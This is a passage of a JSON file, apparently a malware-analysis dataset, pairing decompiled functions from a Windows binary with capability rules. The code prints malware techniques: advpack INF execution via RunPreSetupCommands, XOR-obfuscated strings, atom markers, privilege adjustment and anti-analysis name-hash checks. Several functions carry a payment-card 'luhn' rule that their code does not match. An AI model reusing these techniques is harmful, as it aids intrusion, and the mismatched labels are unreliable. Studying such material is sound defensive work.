        "decompiled_code": "\nuint __cdecl fcn.00407066(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.0040af7d();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 805
    },
    "004085c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004085c3(uint param_1)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpString;\n    uint lpExitTime;\n    uint lpKernelTime;\n    uint lpUserTime;\n    uint lpCreationTime;\n    uint var_2ch;\n    int32_t hObject;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar6 = 8;\n    puVar7 = &lpCreationTime;\n    var_20h = param_1;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_24h = 0;\n    puVar7 = &lpExitTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpKernelTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpUserTime;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (hObject != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)\n                          (hObject, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n        if (iVar4 != 0) {\n            var_18h = 0x471f007f;\n            var_14h = 0x1f1c6272;\n            var_10h = 0x1c627247;\n            var_ch._0_1_ = 0x32;\n            var_8h = 0x6232645a;\n            var_4h._0_1_ = 0x42;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                if (iVar3 != 0x2f653c) {\n                    var_1ch = 5;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpString, iVar4, var_20h, var_2ch, lpCreationTime);\n            iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n            uVar5 = var_24h;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n                if (iVar1 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                    (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                    uVar5 = 1;\n                }\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return uVar5 ^ 1;\n}\n",
        "token_count": 1051
    },
    "00408880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408880(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x412490;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x416890;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.0040872c();\n        if (iVar3 != 0) {\n            iVar3 = fcn.0040872c();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00403980(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 546
    },
    "0040c208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040c208(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41cb38);\n    iVar4 = fcn.00405e58();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x0040c298;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x0040c298:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 471
    },
    "0040e0ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e0ce(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 425
    },
    "0040e5d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040e5d6(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 111
    },
    "0040e5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040e5f0(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 132
    },
    "0040e616": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0040e616(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4103a0;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4103a0;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 421
    },
    "0040591c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040591c(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.004052df();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.00405297();\n    return 0;\n}\n",
        "token_count": 79
    },
    "0040b2bf": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040b2bf(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040c898": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c898(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41cb78 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41cb78 = *0x41cb78 >> 8 ^ *((uVar1 ^ *0x41cb78 & 0xff) * 4 + 0x410400) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.0040f720(0x41cd98);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 445
    },
    "0040b0ca": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b0ca(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41cdf0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 218
    },
    "0040f6ae": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040f6ae(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 338
    },
    "00406483": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406483(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 451
    },
    "0040fddc": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040fddc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040f6ae();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040e32d();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 192
    }
}